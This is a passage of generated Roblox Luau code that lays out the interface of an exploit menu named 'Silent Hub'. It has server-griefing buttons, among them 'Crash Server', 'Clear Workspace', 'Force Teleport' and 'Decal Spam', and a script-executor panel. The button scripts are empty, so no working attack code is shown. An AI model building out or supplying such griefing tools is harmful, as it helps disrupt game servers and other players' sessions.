G2L["7b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7b"]["TextSize"] = 12;
G2L["7b"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["7b"]["RichText"] = true;
G2L["7b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7b"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["7b"]["Name"] = [[Button]];
G2L["7b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7b"]["Text"] = [[Clear Workspace]];
G2L["7b"]["Position"] = UDim2.new(0.94661, 0, 0.05833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["7c"] = Instance.new("LocalScript", G2L["7b"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["7d"] = Instance.new("UIStroke", G2L["7b"]);
G2L["7d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["7d"]["Thickness"] = 1.8;
G2L["7d"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["7e"] = Instance.new("TextButton", G2L["6d"]);
G2L["7e"]["TextWrapped"] = true;
G2L["7e"]["BorderSizePixel"] = 0;
G2L["7e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7e"]["TextSize"] = 12;
G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["7e"]["RichText"] = true;
G2L["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7e"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["7e"]["Name"] = [[Button]];
G2L["7e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7e"]["Text"] = [[Unanchor Workspace]];
G2L["7e"]["Position"] = UDim2.new(0.05812, 0, 0.29167, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["7f"] = Instance.new("LocalScript", G2L["7e"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["80"] = Instance.new("UIStroke", G2L["7e"]);
G2L["80"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["80"]["Thickness"] = 1.8;
G2L["80"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["81"] = Instance.new("TextButton", G2L["6d"]);
G2L["81"]["TextWrapped"] = true;
G2L["81"]["BorderSizePixel"] = 0;
G2L["81"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["81"]["TextSize"] = 12;
G2L["81"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["81"]["RichText"] = true;
G2L["81"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["81"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["81"]["Name"] = [[Button]];
G2L["81"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["81"]["Text"] = [[Clear Terrain]];
G2L["81"]["Position"] = UDim2.new(0.28024, 0, 0.29167, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["82"] = Instance.new("LocalScript", G2L["81"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["83"] = Instance.new("UIStroke", G2L["81"]);
G2L["83"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["83"]["Thickness"] = 1.8;
G2L["83"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["84"] = Instance.new("TextButton", G2L["6d"]);
G2L["84"]["TextWrapped"] = true;
G2L["84"]["BorderSizePixel"] = 0;
G2L["84"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["84"]["TextSize"] = 12;
G2L["84"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["84"]["RichText"] = true;
G2L["84"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["84"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["84"]["Name"] = [[Button]];
G2L["84"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["84"]["Text"] = [[Change Gravity]];
G2L["84"]["Position"] = UDim2.new(0.50236, 0, 0.29167, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["85"] = Instance.new("LocalScript", G2L["84"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["86"] = Instance.new("UIStroke", G2L["84"]);
G2L["86"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["86"]["Thickness"] = 1.8;
G2L["86"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["87"] = Instance.new("TextButton", G2L["6d"]);
G2L["87"]["TextWrapped"] = true;
G2L["87"]["BorderSizePixel"] = 0;
G2L["87"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["87"]["TextSize"] = 12;
G2L["87"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["87"]["RichText"] = true;
G2L["87"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["87"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["87"]["Name"] = [[Button]];
G2L["87"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["87"]["Text"] = [[Set Skybox]];
G2L["87"]["Position"] = UDim2.new(0.72448, 0, 0.29167, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["88"] = Instance.new("LocalScript", G2L["87"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["89"] = Instance.new("UIStroke", G2L["87"]);
G2L["89"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["89"]["Thickness"] = 1.8;
G2L["89"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["8a"] = Instance.new("TextButton", G2L["6d"]);
G2L["8a"]["TextWrapped"] = true;
G2L["8a"]["BorderSizePixel"] = 0;
G2L["8a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8a"]["TextSize"] = 12;
G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["8a"]["RichText"] = true;
G2L["8a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8a"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["8a"]["Name"] = [[Button]];
G2L["8a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8a"]["Text"] = [[Set FogColor]];
G2L["8a"]["Position"] = UDim2.new(0.94661, 0, 0.29167, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["8b"] = Instance.new("LocalScript", G2L["8a"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["8c"] = Instance.new("UIStroke", G2L["8a"]);
G2L["8c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["8c"]["Thickness"] = 1.8;
G2L["8c"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["8d"] = Instance.new("TextButton", G2L["6d"]);
G2L["8d"]["TextWrapped"] = true;
G2L["8d"]["BorderSizePixel"] = 0;
G2L["8d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["TextSize"] = 12;
G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["8d"]["RichText"] = true;
G2L["8d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8d"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["8d"]["Name"] = [[Button]];
G2L["8d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8d"]["Text"] = [[Set FogEnd]];
G2L["8d"]["Position"] = UDim2.new(0.05812, 0, 0.525, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["8e"] = Instance.new("LocalScript", G2L["8d"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["8f"] = Instance.new("UIStroke", G2L["8d"]);
G2L["8f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["8f"]["Thickness"] = 1.8;
G2L["8f"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["90"] = Instance.new("TextButton", G2L["6d"]);
G2L["90"]["TextWrapped"] = true;
G2L["90"]["BorderSizePixel"] = 0;
G2L["90"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["90"]["TextSize"] = 12;
G2L["90"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["90"]["RichText"] = true;
G2L["90"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["90"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["90"]["Name"] = [[Button]];
G2L["90"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["90"]["Text"] = [[Set Time]];
G2L["90"]["Position"] = UDim2.new(0.28024, 0, 0.525, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["91"] = Instance.new("LocalScript", G2L["90"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["92"] = Instance.new("UIStroke", G2L["90"]);
G2L["92"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["92"]["Thickness"] = 1.8;
G2L["92"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["93"] = Instance.new("TextButton", G2L["6d"]);
G2L["93"]["TextWrapped"] = true;
G2L["93"]["BorderSizePixel"] = 0;
G2L["93"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["93"]["TextSize"] = 12;
G2L["93"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["93"]["RichText"] = true;
G2L["93"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["93"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["93"]["Name"] = [[Button]];
G2L["93"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["93"]["Text"] = [[Particles Spam]];
G2L["93"]["Position"] = UDim2.new(0.50236, 0, 0.525, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["94"] = Instance.new("LocalScript", G2L["93"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["95"] = Instance.new("UIStroke", G2L["93"]);
G2L["95"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["95"]["Thickness"] = 1.8;
G2L["95"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["96"] = Instance.new("TextButton", G2L["6d"]);
G2L["96"]["TextWrapped"] = true;
G2L["96"]["BorderSizePixel"] = 0;
G2L["96"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["96"]["TextSize"] = 12;
G2L["96"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["96"]["RichText"] = true;
G2L["96"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["96"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["96"]["Name"] = [[Button]];
G2L["96"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["96"]["Text"] = [[Play SoundId]];
G2L["96"]["Position"] = UDim2.new(0.72448, 0, 0.525, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["97"] = Instance.new("LocalScript", G2L["96"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["98"] = Instance.new("UIStroke", G2L["96"]);
G2L["98"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["98"]["Thickness"] = 1.8;
G2L["98"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["99"] = Instance.new("TextButton", G2L["6d"]);
G2L["99"]["TextWrapped"] = true;
G2L["99"]["BorderSizePixel"] = 0;
G2L["99"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["99"]["TextSize"] = 12;
G2L["99"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["99"]["RichText"] = true;
G2L["99"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["99"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["99"]["Name"] = [[Button]];
G2L["99"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["99"]["Text"] = [[Crash Server]];
G2L["99"]["Position"] = UDim2.new(0.94661, 0, 0.525, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["9a"] = Instance.new("LocalScript", G2L["99"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["9b"] = Instance.new("UIStroke", G2L["99"]);
G2L["9b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["9b"]["Thickness"] = 1.8;
G2L["9b"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["9c"] = Instance.new("TextButton", G2L["6d"]);
G2L["9c"]["TextWrapped"] = true;
G2L["9c"]["BorderSizePixel"] = 0;
G2L["9c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9c"]["TextSize"] = 12;
G2L["9c"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["9c"]["RichText"] = true;
G2L["9c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9c"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["9c"]["Name"] = [[Button]];
G2L["9c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9c"]["Text"] = [[Duck Rain]];
G2L["9c"]["Position"] = UDim2.new(0.05812, 0, 0.75833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["9d"] = Instance.new("LocalScript", G2L["9c"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["9e"] = Instance.new("UIStroke", G2L["9c"]);
G2L["9e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["9e"]["Thickness"] = 1.8;
G2L["9e"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["9f"] = Instance.new("TextButton", G2L["6d"]);
G2L["9f"]["TextWrapped"] = true;
G2L["9f"]["BorderSizePixel"] = 0;
G2L["9f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9f"]["TextSize"] = 12;
G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["9f"]["RichText"] = true;
G2L["9f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9f"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["9f"]["Name"] = [[Button]];
G2L["9f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9f"]["Text"] = [[Force Teleport]];
G2L["9f"]["Position"] = UDim2.new(0.28024, 0, 0.75833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["a0"] = Instance.new("LocalScript", G2L["9f"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["a1"] = Instance.new("UIStroke", G2L["9f"]);
G2L["a1"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["a1"]["Thickness"] = 1.8;
G2L["a1"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["a2"] = Instance.new("TextButton", G2L["6d"]);
G2L["a2"]["TextWrapped"] = true;
G2L["a2"]["BorderSizePixel"] = 0;
G2L["a2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a2"]["TextSize"] = 12;
G2L["a2"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["a2"]["RichText"] = true;
G2L["a2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a2"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["a2"]["Name"] = [[Button]];
G2L["a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a2"]["Text"] = [[Insert Model]];
G2L["a2"]["Position"] = UDim2.new(0.50236, 0, 0.75833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["a3"] = Instance.new("LocalScript", G2L["a2"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["a4"] = Instance.new("UIStroke", G2L["a2"]);
G2L["a4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["a4"]["Thickness"] = 1.8;
G2L["a4"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["a5"] = Instance.new("TextButton", G2L["6d"]);
G2L["a5"]["TextWrapped"] = true;
G2L["a5"]["BorderSizePixel"] = 0;
G2L["a5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a5"]["TextSize"] = 12;
G2L["a5"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["a5"]["RichText"] = true;
G2L["a5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a5"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["a5"]["Name"] = [[Button]];
G2L["a5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a5"]["Text"] = [[Decal Spam]];
G2L["a5"]["Position"] = UDim2.new(0.72448, 0, 0.75833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["a6"] = Instance.new("LocalScript", G2L["a5"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["a7"] = Instance.new("UIStroke", G2L["a5"]);
G2L["a7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["a7"]["Thickness"] = 1.8;
G2L["a7"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["a8"] = Instance.new("TextButton", G2L["6d"]);
G2L["a8"]["TextWrapped"] = true;
G2L["a8"]["BorderSizePixel"] = 0;
G2L["a8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a8"]["TextSize"] = 12;
G2L["a8"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["a8"]["RichText"] = true;
G2L["a8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a8"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["a8"]["Name"] = [[Button]];
G2L["a8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a8"]["Text"] = [[Meshify Workspace]];
G2L["a8"]["Position"] = UDim2.new(0.94661, 0, 0.75833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["a9"] = Instance.new("LocalScript", G2L["a8"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["aa"] = Instance.new("UIStroke", G2L["a8"]);
G2L["aa"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["aa"]["Thickness"] = 1.8;
G2L["aa"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor
G2L["ab"] = Instance.new("Frame", G2L["6"]);
G2L["ab"]["Visible"] = false;
G2L["ab"]["BorderSizePixel"] = 0;
G2L["ab"]["BackgroundColor3"] = Color3.fromRGB(66, 66, 66);
G2L["ab"]["Size"] = UDim2.new(0, 500, 0, 223);
G2L["ab"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["ab"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ab"]["Name"] = [[Executor]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main
G2L["ac"] = Instance.new("Frame", G2L["ab"]);
G2L["ac"]["BorderSizePixel"] = 0;
G2L["ac"]["BackgroundColor3"] = Color3.fromRGB(66, 66, 66);
G2L["ac"]["Size"] = UDim2.new(0, 300, 0, 188);
G2L["ac"]["Position"] = UDim2.new(0.4, 0, 0.15695, 0);
G2L["ac"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ac"]["Name"] = [[Main]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main.Dependent
G2L["ad"] = Instance.new("ScrollingFrame", G2L["ac"]);
G2L["ad"]["Active"] = true;
G2L["ad"]["BorderSizePixel"] = 0;
G2L["ad"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["ad"]["BackgroundColor3"] = Color3.fromRGB(64, 64, 64);
G2L["ad"]["Name"] = [[Dependent]];
G2L["ad"]["Size"] = UDim2.new(0, 499, 0, 34);
G2L["ad"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ad"]["Position"] = UDim2.new(-0.66333, 0, 0.81383, 0);
G2L["ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ad"]["ScrollBarThickness"] = 5;


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main.Dependent.UIListLayout
G2L["ae"] = Instance.new("UIListLayout", G2L["ad"]);
G2L["ae"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["ae"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["ae"]["Wraps"] = true;
G2L["ae"]["Padding"] = UDim.new(0.02, 0);
G2L["ae"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["ae"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["ae"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main.Dependent.Button
G2L["af"] = Instance.new("TextButton", G2L["ad"]);
G2L["af"]["TextWrapped"] = true;
G2L["af"]["BorderSizePixel"] = 0;
G2L["af"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["af"]["TextSize"] = 12;
G2L["af"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["af"]["RichText"] = true;
G2L["af"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["af"]["Size"] = UDim2.new(0, 65, 0, 22);
G2L["af"]["Name"] = [[Button]];
G2L["af"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["af"]["Text"] = [[Execute]];
G2L["af"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main.Dependent.Button.LocalScript
G2L["b0"] = Instance.new("LocalScript", G2L["af"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main.Dependent.Button.UIStroke
G2L["b1"] = Instance.new("UIStroke", G2L["af"]);
G2L["b1"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["b1"]["Thickness"] = 1.8;
G2L["b1"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main.Dependent.Button
G2L["b2"] = Instance.new("TextButton", G2L["ad"]);
G2L["b2"]["TextWrapped"] = true;
G2L["b2"]["BorderSizePixel"] = 0;
G2L["b2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b2"]["TextSize"] = 12;
G2L["b2"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["b2"]["RichText"] = true;
G2L["b2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b2"]["Size"] = UDim2.new(0, 65, 0, 22);
G2L["b2"]["Name"] = [[Button]];
G2L["b2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b2"]["Text"] = [[Clear]];
G2L["b2"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main.Dependent.Button.LocalScript
G2L["b3"] = Instance.new("LocalScript", G2L["b2"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main.Dependent.Button.UIStroke
G2L["b4"] = Instance.new("UIStroke", G2L["b2"]);
G2L["b4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["b4"]["Thickness"] = 1.8;
G2L["b4"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main.InputArea
G2L["b5"] = Instance.new("ScrollingFrame", G2L["ac"]);
G2L["b5"]["Active"] = true;
G2L["b5"]["BorderSizePixel"] = 0;
G2L["b5"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["b5"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["b5"]["Name"] = [[InputArea]];
G2L["b5"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["b5"]["Size"] = UDim2.new(0, 500, 0, 154);
G2L["b5"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["b5"]["Position"] = UDim2.new(-0.66415, 0, -0.00532, 0);
G2L["b5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b5"]["ScrollBarThickness"] = 7;


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main.InputArea.Input
G2L["b6"] = Instance.new("TextBox", G2L["b5"]);
G2L["b6"]["Name"] = [[Input]];
G2L["b6"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["b6"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["b6"]["BorderSizePixel"] = 0;
G2L["b6"]["TextWrapped"] = true;
G2L["b6"]["TextSize"] = 14;
G2L["b6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b6"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["b6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b6"]["RichText"] = true;
G2L["b6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b6"]["MultiLine"] = true;
G2L["b6"]["ClearTextOnFocus"] = false;
G2L["b6"]["Size"] = UDim2.new(0, 374, 0, 136);
G2L["b6"]["Position"] = UDim2.new(0.03093, 0, 0, 0);
G2L["b6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b6"]["Text"] = [[print("Hello World!")]];
G2L["b6"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main.InputArea.Input.LocalScript
G2L["b7"] = Instance.new("LocalScript", G2L["b6"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Executor.Main.InputArea.LineAmount
